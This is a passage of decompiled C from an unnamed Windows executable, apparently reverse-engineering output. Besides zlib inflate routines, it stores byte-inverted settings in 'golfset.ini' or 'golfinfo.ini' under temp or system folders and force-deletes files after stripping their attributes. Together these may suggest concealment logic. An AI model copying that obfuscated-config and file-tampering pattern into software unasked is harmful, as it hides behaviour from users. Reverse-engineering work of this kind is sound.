        if (0x117 < (int)sVar4) {
          uVar1 = 0;
          do {
            _Src = (wchar_t *)(uVar1 + (int)local_c20);
            if ((*(short *)(uVar1 + (int)local_c20) != 0) && (uVar5 < 5)) {
              uVar1 = (uint)uVar5;
              _wcscpy_s(&DAT_004227e0 + uVar1 * 0x8c,0x7f,_Src);
              _memcpy_s(&DAT_004228e4 + uVar1 * 0x46,0x14,_Src + 0x82,0x14);
              (&DAT_004228e0)[uVar1 * 0x46] = *(undefined4 *)(_Src + 0x80);
              uVar5 = uVar5 + 1;
              sVar4 = local_c24;
            }
            local_c18 = local_c18 + 0x118;
            uVar1 = local_c18 & 0xffff;
            _Dst = local_c20;
          } while ((int)(uVar1 + 0x118) <= (int)sVar4);
        }
      }
    }
  }
  if (_Dst != (void *)0x0) {
    _free(_Dst);
  }
LAB_00405c8f:
  if (local_c1c != 0) {
    Ordinal_3(local_c1c);
  }
  ___security_check_cookie_4(local_c ^ (uint)&stack0xfffffffc);
  return;
}



// WARNING: Function: __alloca_probe replaced with injection: alloca_probe
// WARNING: Globals starting with '_' overlap smaller symbols at the same address

void __thiscall FUN_00405cc0(void *this,undefined4 param_1,undefined4 param_2)

{
  short sVar1;
  short *psVar2;
  char *_Dst;
  wchar_t *pwVar3;
  int iVar4;
  int iVar5;
  undefined4 *puVar6;
  undefined4 *puVar7;
  size_t local_102c;
  undefined4 local_1028;
  int local_1024;
  FILE *local_1020;
  wchar_t local_101c;
  undefined local_101a [2046];
  wchar_t local_81c;
  undefined4 local_81a [255];
  WCHAR local_41c [260];
  wchar_t local_214;
  undefined local_212 [522];
  uint local_8;
  
  local_8 = DAT_00420044 ^ (uint)&stack0xfffffffc;
  _memset(&local_81c,0,0x400);
  _wcscpy_s(&local_81c,0x1ff,(wchar_t *)this);
  psVar2 = (short *)this;
  do {
    sVar1 = *psVar2;
    psVar2 = psVar2 + 1;
  } while (sVar1 != 0);
  puVar6 = &DAT_00423620;
  puVar7 = (undefined4 *)((int)local_81a + ((int)psVar2 - ((int)this + 2) >> 1) * 2);
  for (iVar5 = 0x80; iVar5 != 0; iVar5 = iVar5 + -1) {
    *puVar7 = *puVar6;
    puVar6 = puVar6 + 1;
    puVar7 = puVar7 + 1;
  }
  iVar5 = (int)this + 2;
  do {
                    // WARNING: Load size is inaccurate
    sVar1 = *this;
    this = (void *)((int)this + 2);
  } while (sVar1 != 0);
  _Dst = (char *)_malloc(0x10000);
  _memset(_Dst,0,0x10000);
  local_102c = 0x10000;
  local_101c = L'\0';
  _memset(local_101a,0,0x7fe);
  local_1024 = 0;
  local_1028 = 0;
  local_1020 = (FILE *)0x0;
  local_214 = L'\0';
  _memset(local_212,0,0x206);
  GetModuleFileNameW((HMODULE)0x0,local_41c,0x104);
  pwVar3 = _wcsrchr(local_41c,L'\\');
  *pwVar3 = L'\0';
  _wcscpy_s(&local_214,0x104,local_41c);
  _wcscat_s(&local_214,0x103,(wchar_t *)&DAT_0041c284);
  iVar4 = FUN_004051a0(&local_101c,param_1,param_2);
  if ((((iVar4 != 0) &&
       (iVar5 = FUN_00405410(&local_101c,&local_1024,0xbba,&local_81c,
                             ((int)this - iVar5 >> 1) * 2 + 0x202,&local_101c), iVar5 != 0)) &&
      (iVar5 = FUN_004057a0(_Dst,&local_102c,&local_1024,(undefined2 *)&local_1020,&local_101c),
      iVar5 != 0)) && ((((short)local_1020 == 0xbba && (local_102c != 0)) && (*_Dst == '\0')))) {
    _wcscat_s(&local_214,0x104,(wchar_t *)&DAT_00423418);
    local_1020 = (FILE *)0x0;
    _DAT_004227d8 = 0;
    __wfopen_s(&local_1020,&local_214,(wchar_t *)&DAT_0041c3f8);
    if (local_1020 != (FILE *)0x0) {
      FUN_004059b0(&local_1020);
    }
  }
  if (_Dst != (char *)0x0) {
    _free(_Dst);
  }
  if (local_1024 != 0) {
    Ordinal_3(local_1024);
  }
  ___security_check_cookie_4(local_8 ^ (uint)&stack0xfffffffc);
  return;
}



void FUN_00405f60(void)

{
  void *unaff_ESI;
  FILE *local_214;
  WCHAR local_210;
  undefined local_20e [518];
  uint local_8;
  
  local_8 = DAT_00420044 ^ (uint)&stack0xfffffffc;
  local_210 = L'\0';
  _memset(local_20e,0,0x206);
  local_214 = (FILE *)0x0;
  if (unaff_ESI != (void *)0x0) {
    if (DAT_00420f10 == 3) {
      GetSystemDirectoryW(&local_210,0x104);
      _wcscat_s(&local_210,0x104,(wchar_t *)&DAT_0041c284);
    }
    else {
      GetTempPathW(0x104,&local_210);
    }
    _wcscat_s(&local_210,0x104,u_golfset_ini_0041c304);
    __wfopen_s(&local_214,&local_210,(wchar_t *)&DAT_0041c3f0);
    if (local_214 != (FILE *)0x0) {
      _fread(unaff_ESI,0x200,1,local_214);
      _fclose(local_214);
      ___security_check_cookie_4(local_8 ^ (uint)&stack0xfffffffc);
      return;
    }
  }
  ___security_check_cookie_4(local_8 ^ (uint)&stack0xfffffffc);
  return;
}



void FUN_00406070(void)

{
  void *unaff_ESI;
  FILE *local_214;
  WCHAR local_210;
  undefined local_20e [518];
  uint local_8;
  
  local_8 = DAT_00420044 ^ (uint)&stack0xfffffffc;
  local_210 = L'\0';
  _memset(local_20e,0,0x206);
  local_214 = (FILE *)0x0;
  if (unaff_ESI != (void *)0x0) {
    GetTempPathW(0x104,&local_210);
    _wcscat_s(&local_210,0x104,u_golfinfo_ini_0041c574);
    __wfopen_s(&local_214,&local_210,(wchar_t *)&DAT_0041c3f0);
    if (local_214 != (FILE *)0x0) {
      _fread(unaff_ESI,0x200,1,local_214);
      _fclose(local_214);
      ___security_check_cookie_4(local_8 ^ (uint)&stack0xfffffffc);
      return;
    }
  }
  ___security_check_cookie_4(local_8 ^ (uint)&stack0xfffffffc);
  return;
}



void __cdecl FUN_00406140(int param_1)

{
  int iVar1;
  uint uVar2;
  void *unaff_EDI;
  int local_210 [129];
  uint local_c;
  
  local_c = DAT_00420044 ^ (uint)&stack0xfffffffc;
  if (unaff_EDI != (void *)0x0) {
    _memset(local_210,0,0x200);
    if (param_1 == 0) {
      iVar1 = FUN_00405f60();
    }
    else {
      iVar1 = FUN_00406070();
    }
    if (iVar1 != 0) {
      uVar2 = 0;
      do {
        *(byte *)((int)local_210 + uVar2) = ~*(byte *)((int)local_210 + uVar2);
        uVar2 = uVar2 + 1;
      } while (uVar2 < 0x200);
      if (local_210[0] == 0x504d534d) {
        FID_conflict__memcpy(unaff_EDI,local_210,0x200);
        ___security_check_cookie_4(local_c ^ (uint)&stack0xfffffffc);
        return;
      }
    }
  }
  ___security_check_cookie_4(local_c ^ (uint)&stack0xfffffffc);
  return;
}



void __cdecl FUN_004061f0(int *param_1)

{
  uint uVar1;
  FILE *local_41c;
  byte local_418 [512];
  WCHAR local_218;
  undefined local_216 [522];
  uint local_c;
  
  local_c = DAT_00420044 ^ (uint)&stack0xfffffffc;
  if ((param_1 != (int *)0x0) && (*param_1 == 0x504d534d)) {
    FID_conflict__memcpy(local_418,param_1,0x200);
    uVar1 = 0;
    do {
      local_418[uVar1] = ~local_418[uVar1];
      uVar1 = uVar1 + 1;
    } while (uVar1 < 0x200);
    local_218 = L'\0';
    _memset(local_216,0,0x206);
    local_41c = (FILE *)0x0;
    GetTempPathW(0x104,&local_218);
    _wcscat_s(&local_218,0x104,u_golfinfo_ini_0041c574);
    __wfopen_s(&local_41c,&local_218,(wchar_t *)&DAT_0041c3f8);
    if (local_41c != (FILE *)0x0) {
      _fwrite(local_418,0x200,1,local_41c);
      _fclose(local_41c);
    }
    ___security_check_cookie_4(local_c ^ (uint)&stack0xfffffffc);
    return;
  }
  ___security_check_cookie_4(local_c ^ (uint)&stack0xfffffffc);
  return;
}



HANDLE FUN_00406310(void)

{
  DWORD DVar1;
  BOOL BVar2;
  HANDLE pvVar3;
  LPCWSTR unaff_ESI;
  
  DVar1 = GetFileAttributesW(unaff_ESI);
  if (DVar1 != 0xffffffff) {
    DVar1 = GetFileAttributesW(unaff_ESI);
    if (DVar1 != 0xffffffff) {
      if ((DVar1 & 1) != 0) {
        DVar1 = DVar1 ^ 1;
      }
      if ((DVar1 & 4) != 0) {
        DVar1 = DVar1 ^ 4;
      }
      if ((DVar1 & 2) != 0) {
        DVar1 = DVar1 ^ 2;
      }
      if ((DVar1 & 0x20) != 0) {
        DVar1 = DVar1 ^ 0x20;
      }
      SetFileAttributesW(unaff_ESI,DVar1);
      BVar2 = DeleteFileW(unaff_ESI);
      GetLastError();
      if (BVar2 != 0) goto LAB_00406363;
    }
    return (HANDLE)0xffffffff;
  }
LAB_00406363:
  pvVar3 = CreateFileW(unaff_ESI,0x40000000,1,(LPSECURITY_ATTRIBUTES)0x0,2,0,(HANDLE)0x0);
  return pvVar3;
}



// WARNING: Globals starting with '_' overlap smaller symbols at the same address

void __fastcall FUN_00406380(undefined4 param_1,void **param_2,undefined4 param_3,void *param_4)

{
  int *piVar1;
  int iVar2;
  int *piVar3;
  int local_23c;
  undefined2 local_238;
  undefined4 local_30;
  undefined4 local_2c;
  undefined4 local_28;
  undefined4 local_24;
  undefined4 local_20;
  undefined4 local_1c;
  undefined4 local_18;
  undefined4 local_14;
  void *local_10;
  uint local_8;
  
  local_8 = DAT_00420044 ^ (uint)&stack0xfffffffc;
  piVar3 = FUN_0040a560(param_3,param_1);
  if (piVar3 != (int *)0x0) {
    if (*piVar3 == 1) {
      piVar1 = (int *)piVar3[1];
      if (*(uint *)(*piVar1 + 4) < 0x80000000) {
        if (piVar1[1] != -1) {
          FUN_00409b40();
        }
        piVar1[1] = -1;
        local_30 = 0;
        local_2c = 0;
        local_28 = 0;
        local_24 = 0;
        local_20 = 0;
        local_1c = 0;
        local_18 = 0;
        local_14 = 0;
        _DAT_00423820 = 0;
      }
      else {
        _DAT_00423820 = 0x10000;
      }
    }
    else {
      _DAT_00423820 = 0x80000;
    }
    local_23c = 0;
    local_238 = 0;
    local_10 = (void *)0x0;
    if (*piVar3 == 1) {
      _DAT_00423820 = FUN_00409d70((int *)piVar3[1],&local_23c,0);
    }
    else {
      _DAT_00423820 = 0x80000;
    }
    if (*piVar3 == 1) {
      _DAT_00423820 = FUN_0040a3b0(param_4,*param_2);
    }
    else {
      _DAT_00423820 = 0x80000;
    }
    *param_2 = local_10;
    if (*piVar3 == 1) {
      iVar2 = piVar3[1];
      _DAT_00423820 = FUN_0040a500();
      if (iVar2 != 0) {
        FUN_0040a650();
      }
      FUN_0040a83e(piVar3);
    }
    else {
      _DAT_00423820 = 0x80000;
    }
    ___security_check_cookie_4(local_8 ^ (uint)&stack0xfffffffc);
    return;
  }
  ___security_check_cookie_4(local_8 ^ (uint)&stack0xfffffffc);
  return;
}



int __cdecl FUN_004064e0(int param_1)

{
  uint uVar1;
  undefined4 uVar2;
  void *_Src;
  int unaff_EBX;
  int unaff_ESI;
  void *pvVar3;
  uint uVar4;
  void *local_c;
  
  local_c = *(void **)(unaff_EBX + 0xc);
  pvVar3 = *(void **)(unaff_ESI + 0x34);
  _Src = *(void **)(unaff_ESI + 0x30);
  if (pvVar3 < _Src) {
    pvVar3 = *(void **)(unaff_ESI + 0x2c);
  }
  uVar1 = *(uint *)(unaff_EBX + 0x10);
  uVar4 = (int)pvVar3 - (int)_Src;
  if (uVar1 < (uint)((int)pvVar3 - (int)_Src)) {
    uVar4 = uVar1;
  }
  if ((uVar4 != 0) && (param_1 == -5)) {
    param_1 = 0;
  }
  *(int *)(unaff_EBX + 0x14) = *(int *)(unaff_EBX + 0x14) + uVar4;
  *(uint *)(unaff_EBX + 0x10) = uVar1 - uVar4;
  if (*(code **)(unaff_ESI + 0x38) != (code *)0x0) {
    uVar2 = (**(code **)(unaff_ESI + 0x38))(*(undefined4 *)(unaff_ESI + 0x3c),_Src,uVar4);
    *(undefined4 *)(unaff_ESI + 0x3c) = uVar2;
    *(undefined4 *)(unaff_EBX + 0x30) = uVar2;
  }
  if (uVar4 != 0) {
    FID_conflict__memcpy(local_c,_Src,uVar4);
    local_c = (void *)((int)local_c + uVar4);
    _Src = (void *)((int)_Src + uVar4);
  }
  if (_Src == *(void **)(unaff_ESI + 0x2c)) {
    _Src = *(void **)(unaff_ESI + 0x28);
    if (*(void **)(unaff_ESI + 0x34) == *(void **)(unaff_ESI + 0x2c)) {
      *(void **)(unaff_ESI + 0x34) = _Src;
    }
    uVar1 = *(uint *)(unaff_EBX + 0x10);
    uVar4 = *(int *)(unaff_ESI + 0x34) - (int)_Src;
    if (uVar1 < uVar4) {
      uVar4 = uVar1;
    }
    if ((uVar4 != 0) && (param_1 == -5)) {
      param_1 = 0;
    }
    *(int *)(unaff_EBX + 0x14) = *(int *)(unaff_EBX + 0x14) + uVar4;
    *(uint *)(unaff_EBX + 0x10) = uVar1 - uVar4;
    if (*(code **)(unaff_ESI + 0x38) != (code *)0x0) {
      uVar2 = (**(code **)(unaff_ESI + 0x38))(*(undefined4 *)(unaff_ESI + 0x3c),_Src,uVar4);
      *(undefined4 *)(unaff_ESI + 0x3c) = uVar2;
      *(undefined4 *)(unaff_EBX + 0x30) = uVar2;
    }
    if (uVar4 != 0) {
      FID_conflict__memcpy(local_c,_Src,uVar4);
      local_c = (void *)((int)local_c + uVar4);
      _Src = (void *)((int)_Src + uVar4);
    }
  }
  *(void **)(unaff_EBX + 0xc) = local_c;
  *(void **)(unaff_ESI + 0x30) = _Src;
  return param_1;
}



void __cdecl FUN_004065e0(undefined param_1,undefined param_2,undefined4 param_3,undefined4 param_4)

{
  int in_EAX;
  undefined4 *puVar1;
  
  puVar1 = (undefined4 *)(**(code **)(in_EAX + 0x20))(*(undefined4 *)(in_EAX + 0x28),1,0x1c);
  if (puVar1 != (undefined4 *)0x0) {
    *(undefined *)(puVar1 + 4) = param_1;
    *(undefined *)((int)puVar1 + 0x11) = param_2;
    *puVar1 = 0;
    puVar1[5] = param_3;
    puVar1[6] = param_4;
  }
  return;
}



void __thiscall FUN_00406620(void *this,int param_1)

{
  byte bVar1;
  uint *puVar2;
  undefined *puVar3;
  byte *pbVar4;
  byte **in_EAX;
  uint uVar5;
  undefined *puVar6;
  undefined *puVar7;
  uint uVar8;
  int iVar9;
  undefined *local_20;
  byte *local_1c;
  undefined *local_18;
  byte *local_14;
  byte *local_10;
  uint local_8;
  
  local_10 = *in_EAX;
  local_14 = in_EAX[1];
  puVar2 = *(uint **)((int)this + 4);
  local_8 = *(uint *)((int)this + 0x20);
  puVar7 = *(undefined **)((int)this + 0x34);
  uVar8 = *(uint *)((int)this + 0x1c);
  if (puVar7 < *(undefined **)((int)this + 0x30)) {
    local_18 = *(undefined **)((int)this + 0x30) + (-1 - (int)puVar7);
  }
  else {
    local_18 = (undefined *)(*(int *)((int)this + 0x2c) - (int)puVar7);
  }
  uVar5 = *puVar2;
  while (uVar5 < 10) {
    switch(uVar5) {
    case 0:
      if ((local_18 < (undefined *)0x102) || (local_14 < (byte *)0xa)) {
LAB_00406714:
        puVar2[3] = (uint)*(byte *)(puVar2 + 4);
        puVar2[2] = puVar2[5];
        *puVar2 = 1;
        goto switchD_00406670_caseD_1;
      }
      *(uint *)((int)this + 0x20) = local_8;
      *(uint *)((int)this + 0x1c) = uVar8;
      in_EAX[1] = local_14;
      pbVar4 = *in_EAX;
      *in_EAX = local_10;
      in_EAX[2] = in_EAX[2] + ((int)local_10 - (int)pbVar4);
      *(undefined **)((int)this + 0x34) = puVar7;
      param_1 = FUN_00407f00((uint)*(byte *)(puVar2 + 4),(uint)*(byte *)((int)puVar2 + 0x11),
                             puVar2[5],puVar2[6],(int)this,in_EAX);
      local_10 = *in_EAX;
      local_14 = in_EAX[1];
      uVar8 = *(uint *)((int)this + 0x1c);
      local_8 = *(uint *)((int)this + 0x20);
      puVar7 = *(undefined **)((int)this + 0x34);
      if (puVar7 < *(undefined **)((int)this + 0x30)) {
        local_18 = *(undefined **)((int)this + 0x30) + (-1 - (int)puVar7);
      }
      else {
        local_18 = (undefined *)(*(int *)((int)this + 0x2c) - (int)puVar7);
      }
      if (param_1 == 0) goto LAB_00406714;
      *puVar2 = (uint)(param_1 != 1) * 2 + 7;
      goto LAB_00406b2f;
    case 1:
switchD_00406670_caseD_1:
      for (; uVar8 < puVar2[3]; uVar8 = uVar8 + 8) {
        if (local_14 == (byte *)0x0) goto LAB_00406b6c;
        local_14 = local_14 + -1;
        bVar1 = *local_10;
        local_10 = local_10 + 1;
        local_8 = local_8 | (uint)bVar1 << ((byte)uVar8 & 0x1f);
        param_1 = 0;
      }
      local_1c = (byte *)(puVar2[2] + (*(uint *)(&DAT_0041cbd8 + puVar2[3] * 4) & local_8) * 8);
      local_8 = local_8 >> (local_1c[1] & 0x1f);
      uVar8 = uVar8 - local_1c[1];
      bVar1 = *local_1c;
      uVar5 = (uint)bVar1;
      if (uVar5 == 0) {
        puVar2[2] = *(uint *)(local_1c + 4);
        *puVar2 = 6;
        goto LAB_00406b2f;
      }
      if ((bVar1 & 0x10) != 0) {
        puVar2[2] = uVar5 & 0xf;
        puVar2[1] = *(uint *)(local_1c + 4);
        *puVar2 = 2;
        goto LAB_00406b2f;
      }
      if ((bVar1 & 0x40) != 0) {
        if ((bVar1 & 0x20) != 0) {
          *puVar2 = 7;
          goto LAB_00406b2f;
        }
        *puVar2 = 9;
        in_EAX[6] = (byte *)s_invalid_literal_length_code_0041e3bc;
        goto LAB_00406bab;
      }
      goto LAB_004067de;
    case 2:
      uVar5 = puVar2[2];
      for (; uVar8 < uVar5; uVar8 = uVar8 + 8) {
        if (local_14 == (byte *)0x0) goto LAB_00406b6c;
        local_14 = local_14 + -1;
        bVar1 = *local_10;
        local_10 = local_10 + 1;
        local_8 = local_8 | (uint)bVar1 << ((byte)uVar8 & 0x1f);
        param_1 = 0;
      }
      puVar2[1] = puVar2[1] + (*(uint *)(&DAT_0041cbd8 + uVar5 * 4) & local_8);
      local_8 = local_8 >> ((byte)uVar5 & 0x1f);
      uVar8 = uVar8 - uVar5;
      puVar2[3] = (uint)*(byte *)((int)puVar2 + 0x11);
      puVar2[2] = puVar2[6];
      *puVar2 = 3;
      break;
    case 3:
      break;
    case 4:
      uVar5 = puVar2[2];
      for (; uVar8 < uVar5; uVar8 = uVar8 + 8) {
        if (local_14 == (byte *)0x0) goto LAB_00406b6c;
        local_14 = local_14 + -1;
        bVar1 = *local_10;
        local_10 = local_10 + 1;
        local_8 = local_8 | (uint)bVar1 << ((byte)uVar8 & 0x1f);
        param_1 = 0;
      }
      puVar2[3] = puVar2[3] + (*(uint *)(&DAT_0041cbd8 + uVar5 * 4) & local_8);
      local_8 = local_8 >> ((byte)uVar5 & 0x1f);
      uVar8 = uVar8 - uVar5;
      *puVar2 = 5;
    case 5:
      local_20 = puVar7 + -puVar2[3];
      if (local_20 < *(undefined **)((int)this + 0x28)) {
        do {
          local_20 = local_20 +
                     (*(int *)((int)this + 0x2c) - (int)*(undefined **)((int)this + 0x28));
        } while (local_20 < *(undefined **)((int)this + 0x28));
      }
      uVar5 = puVar2[1];
      while (uVar5 != 0) {
        puVar6 = puVar7;
        if (local_18 == (undefined *)0x0) {
          if (puVar7 == *(undefined **)((int)this + 0x2c)) {
            local_18 = *(undefined **)((int)this + 0x30);
            puVar6 = *(undefined **)((int)this + 0x28);
            if (local_18 != puVar6) {
              if (puVar6 < local_18) {
                local_18 = local_18 + (-1 - (int)puVar6);
              }
              else {
                local_18 = (undefined *)(*(int *)((int)this + 0x2c) - (int)puVar6);
              }
              puVar7 = puVar6;
              if (local_18 != (undefined *)0x0) goto LAB_00406a5c;
            }
          }
          *(undefined **)((int)this + 0x34) = puVar7;
          param_1 = FUN_004064e0(param_1);
          puVar6 = *(undefined **)((int)this + 0x34);
          if (puVar6 < *(undefined **)((int)this + 0x30)) {
            local_18 = *(undefined **)((int)this + 0x30) + (-1 - (int)puVar6);
          }
          else {
            local_18 = (undefined *)(*(int *)((int)this + 0x2c) - (int)puVar6);
          }
          if (puVar6 == *(undefined **)((int)this + 0x2c)) {
            puVar7 = *(undefined **)((int)this + 0x28);
            puVar3 = *(undefined **)((int)this + 0x30);
            if (puVar3 != puVar7) {
              puVar6 = puVar7;
              if (puVar7 < puVar3) {
                local_18 = puVar3 + (-1 - (int)puVar7);
              }
              else {
                local_18 = (undefined *)(*(int *)((int)this + 0x2c) - (int)puVar7);
              }
            }
          }
          if (local_18 == (undefined *)0x0) goto LAB_00406bbe;
        }
LAB_00406a5c:
        *puVar6 = *local_20;
        local_20 = local_20 + 1;
        local_18 = local_18 + -1;
        puVar7 = puVar6 + 1;
        param_1 = 0;
        if (local_20 == *(undefined **)((int)this + 0x2c)) {
          local_20 = *(undefined **)((int)this + 0x28);
        }
        puVar2[1] = puVar2[1] - 1;
        uVar5 = puVar2[1];
      }
LAB_00406b29:
      *puVar2 = 0;
      goto LAB_00406b2f;
    case 6:
      puVar6 = puVar7;
      if (local_18 == (undefined *)0x0) {
        if (puVar7 == *(undefined **)((int)this + 0x2c)) {
          local_18 = *(undefined **)((int)this + 0x30);
          puVar6 = *(undefined **)((int)this + 0x28);
          if (local_18 != puVar6) {
            if (puVar6 < local_18) {
              local_18 = local_18 + (-1 - (int)puVar6);
            }
            else {
              local_18 = (undefined *)(*(int *)((int)this + 0x2c) - (int)puVar6);
            }
            puVar7 = puVar6;
            if (local_18 != (undefined *)0x0) goto LAB_00406b12;
          }
        }
        *(undefined **)((int)this + 0x34) = puVar7;
        param_1 = FUN_004064e0(param_1);
        puVar6 = *(undefined **)((int)this + 0x34);
        if (puVar6 < *(undefined **)((int)this + 0x30)) {
          local_18 = *(undefined **)((int)this + 0x30) + (-1 - (int)puVar6);
        }
        else {
          local_18 = (undefined *)(*(int *)((int)this + 0x2c) - (int)puVar6);
        }
        if (puVar6 == *(undefined **)((int)this + 0x2c)) {
          puVar7 = *(undefined **)((int)this + 0x28);
          puVar3 = *(undefined **)((int)this + 0x30);
          if (puVar3 != puVar7) {
            puVar6 = puVar7;
            if (puVar7 < puVar3) {
              local_18 = puVar3 + (-1 - (int)puVar7);
            }
            else {
              local_18 = (undefined *)(*(int *)((int)this + 0x2c) - (int)puVar7);
            }
          }
        }
        if (local_18 == (undefined *)0x0) {
LAB_00406bbe:
          *(uint *)((int)this + 0x20) = local_8;
          *(uint *)((int)this + 0x1c) = uVar8;
          in_EAX[1] = local_14;
          puVar7 = puVar6;
          goto LAB_00406b7c;
        }
      }
LAB_00406b12:
      *puVar6 = *(undefined *)(puVar2 + 2);
      puVar7 = puVar6 + 1;
      local_18 = local_18 + -1;
      param_1 = 0;
      goto LAB_00406b29;
    case 7:
      if (7 < uVar8) {
        local_14 = local_14 + 1;
        uVar8 = uVar8 - 8;
        local_10 = local_10 + -1;
      }
      *(undefined **)((int)this + 0x34) = puVar7;
      iVar9 = FUN_004064e0(param_1);
      puVar7 = *(undefined **)((int)this + 0x34);
      if (*(undefined **)((int)this + 0x30) != puVar7) {
        *(uint *)((int)this + 0x20) = local_8;
        *(uint *)((int)this + 0x1c) = uVar8;
        in_EAX[1] = local_14;
        pbVar4 = *in_EAX;
        *in_EAX = local_10;
        in_EAX[2] = in_EAX[2] + ((int)local_10 - (int)pbVar4);
        *(undefined **)((int)this + 0x34) = puVar7;
        FUN_004064e0(iVar9);
        return;
      }
      *puVar2 = 8;
    case 8:
      *(uint *)((int)this + 0x20) = local_8;
      *(uint *)((int)this + 0x1c) = uVar8;
      in_EAX[1] = local_14;
      iVar9 = 1;
      goto LAB_00406b4e;
    case 9:
      iVar9 = -3;
      goto LAB_00406b3f;
    }
    for (; uVar8 < puVar2[3]; uVar8 = uVar8 + 8) {
      if (local_14 == (byte *)0x0) goto LAB_00406b6c;
      local_14 = local_14 + -1;
      bVar1 = *local_10;
      local_10 = local_10 + 1;
      local_8 = local_8 | (uint)bVar1 << ((byte)uVar8 & 0x1f);
      param_1 = 0;
    }
    local_1c = (byte *)(puVar2[2] + (*(uint *)(&DAT_0041cbd8 + puVar2[3] * 4) & local_8) * 8);
    local_8 = local_8 >> (local_1c[1] & 0x1f);
    bVar1 = *local_1c;
    uVar5 = (uint)bVar1;
    uVar8 = uVar8 - local_1c[1];
    if ((bVar1 & 0x10) == 0) {
      if ((bVar1 & 0x40) != 0) {
        *puVar2 = 9;
        in_EAX[6] = (byte *)s_invalid_distance_code_0041e3d8;
LAB_00406bab:
        *(uint *)((int)this + 0x20) = local_8;
        *(uint *)((int)this + 0x1c) = uVar8;
        in_EAX[1] = local_14;
        iVar9 = -3;
        goto LAB_00406b4e;
      }
LAB_004067de:
      puVar2[3] = uVar5;
      puVar2[2] = (uint)(local_1c + *(int *)(local_1c + 4) * 8);
    }
    else {
      puVar2[2] = uVar5 & 0xf;
      puVar2[3] = *(uint *)(local_1c + 4);
      *puVar2 = 4;
    }
LAB_00406b2f:
    uVar5 = *puVar2;
  }
  iVar9 = -2;
LAB_00406b3f:
  *(uint *)((int)this + 0x20) = local_8;
  *(uint *)((int)this + 0x1c) = uVar8;
  in_EAX[1] = local_14;
LAB_00406b4e:
  pbVar4 = *in_EAX;
  *in_EAX = local_10;
  in_EAX[2] = in_EAX[2] + ((int)local_10 - (int)pbVar4);
  *(undefined **)((int)this + 0x34) = puVar7;
  FUN_004064e0(iVar9);
  return;
LAB_00406b6c:
  *(uint *)((int)this + 0x20) = local_8;
  *(uint *)((int)this + 0x1c) = uVar8;
  in_EAX[1] = (byte *)0x0;
LAB_00406b7c:
  pbVar4 = *in_EAX;
  *in_EAX = local_10;
  in_EAX[2] = in_EAX[2] + ((int)local_10 - (int)pbVar4);
  *(undefined **)((int)this + 0x34) = puVar7;
  FUN_004064e0(param_1);
  return;
}



void FUN_00406c80(void)

{
  int *in_EAX;
  int iVar1;
  int *unaff_ESI;
  int unaff_EDI;
  
  if (in_EAX != (int *)0x0) {
    *in_EAX = unaff_ESI[0xf];
  }
  if ((*unaff_ESI == 4) || (*unaff_ESI == 5)) {
    (**(code **)(unaff_EDI + 0x24))(*(undefined4 *)(unaff_EDI + 0x28),unaff_ESI[3]);
  }
  if (*unaff_ESI == 6) {
    (**(code **)(unaff_EDI + 0x24))(*(undefined4 *)(unaff_EDI + 0x28),unaff_ESI[1]);
  }
  unaff_ESI[0xd] = unaff_ESI[10];
  unaff_ESI[0xc] = unaff_ESI[10];
  *unaff_ESI = 0;
  unaff_ESI[7] = 0;
  unaff_ESI[8] = 0;
  if ((code *)unaff_ESI[0xe] != (code *)0x0) {
    iVar1 = (*(code *)unaff_ESI[0xe])(0,0,0);
    unaff_ESI[0xf] = iVar1;
    *(int *)(unaff_EDI + 0x30) = iVar1;
  }
  return;
}



undefined4 * __cdecl FUN_00406cf0(undefined4 param_1)

{
  int in_EAX;
  undefined4 *puVar1;
  int iVar2;
  int unaff_EBX;
  
  puVar1 = (undefined4 *)(**(code **)(in_EAX + 0x20))(*(undefined4 *)(in_EAX + 0x28),1,0x40);
  if (puVar1 != (undefined4 *)0x0) {
    iVar2 = (**(code **)(in_EAX + 0x20))(*(undefined4 *)(in_EAX + 0x28),8,0x5a0);
    puVar1[9] = iVar2;
    if (iVar2 != 0) {
      iVar2 = (**(code **)(in_EAX + 0x20))(*(undefined4 *)(in_EAX + 0x28),1);
      puVar1[10] = iVar2;
      if (iVar2 == 0) {
        (**(code **)(in_EAX + 0x24))(*(undefined4 *)(in_EAX + 0x28),puVar1[9]);
        (**(code **)(in_EAX + 0x24))(*(undefined4 *)(in_EAX + 0x28),puVar1);
        return (undefined4 *)0x0;
      }
      puVar1[0xb] = iVar2 + unaff_EBX;
      puVar1[0xe] = param_1;
      *puVar1 = 0;
      FUN_00406c80();
      return puVar1;
    }
    (**(code **)(in_EAX + 0x24))(*(undefined4 *)(in_EAX + 0x28),puVar1);
  }
  return (undefined4 *)0x0;
}



// WARNING: Type propagation algorithm not settling

void __thiscall FUN_00406d90(void *this,byte *param_1)

{
  int *piVar1;
  byte bVar2;
  byte *pbVar3;
  byte *pbVar4;
  byte **in_EAX;
  uint uVar5;
  uint uVar6;
  undefined4 uVar7;
  undefined4 *puVar8;
  byte bVar9;
  uint *puVar10;
  int iVar11;
  uint *puVar12;
  uint *local_30;
  uint *local_2c;
  uint local_28;
  uint *local_24;
  byte *local_20;
  uint *local_1c;
  byte *local_18;
  byte *local_14;
  byte *local_10;
  byte *local_c;
  uint local_8;
  
  local_c = *in_EAX;
  local_10 = in_EAX[1];
  local_14 = *(byte **)((int)this + 0x34);
  uVar6 = *(uint *)((int)this + 0x20);
  puVar12 = *(uint **)((int)this + 0x1c);
  if (local_14 < *(byte **)((int)this + 0x30)) {
    local_18 = *(byte **)((int)this + 0x30) + (-1 - (int)local_14);
  }
  else {
    local_18 = (byte *)(*(int *)((int)this + 0x2c) - (int)local_14);
  }
                    // WARNING: Load size is inaccurate
  uVar5 = *this;
  local_8 = uVar6;
  do {
    switch(uVar5) {
    case 0:
      for (; puVar12 < (uint *)0x3; puVar12 = puVar12 + 2) {
        if (local_10 == (byte *)0x0) goto LAB_0040752c;
        local_10 = local_10 + -1;
        param_1 = (byte *)0x0;
        uVar6 = uVar6 | (uint)*local_c << ((byte)puVar12 & 0x1f);
        local_c = local_c + 1;
        local_8 = uVar6;
      }
      *(uint *)((int)this + 0x18) = uVar6 & 1;
      switch((uVar6 & 7) >> 1) {
      case 0:
        uVar5 = (uint)(byte *)((int)puVar12 + -3) & 7;
        uVar6 = (uVar6 >> 3) >> (sbyte)uVar5;
        puVar12 = (uint *)((byte *)((int)puVar12 + -3) + -uVar5);
        *(undefined4 *)this = 1;
        local_8 = uVar6;
        break;
      case 1:
        iVar11 = FUN_004065e0(9,5,&DAT_0041cc20,&DAT_0041dc20);
        *(int *)((int)this + 4) = iVar11;
        if (iVar11 == 0) {
          param_1 = (byte *)0xfffffffc;
          goto LAB_004074f0;
        }
